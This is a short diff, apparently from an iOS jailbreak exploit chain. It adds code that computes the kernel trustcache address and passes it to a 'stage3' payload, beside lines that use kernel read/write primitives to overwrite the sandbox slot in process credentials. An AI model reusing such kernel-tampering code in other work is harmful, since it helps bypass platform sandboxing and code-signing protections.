@@ -113,7 +113,11 @@ int main() {
   memset(kern_proc_str, 0, 19);
   snprintf(kern_proc_str, sizeof(kern_proc_str), "0x%016" PRIx64, kern_struct_proc);
 
-  launch_stage3(stage3_path, kernel_base_str, kern_proc_str, NULL, NULL, NULL, NULL, NULL);
+  char trustcache_str[19];
+  memset(trustcache_str, 0, 19);
+  snprintf(trustcache_str, sizeof(trustcache_str), "0x%016" PRIx64, kernel_slide + koffset(KOFFSET_TRUSTCACHE));
+
+  launch_stage3(stage3_path, kernel_base_str, kern_proc_str, trustcache_str, NULL, NULL, NULL, NULL);
 
   //restore sandbox
   wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), saved_sb);
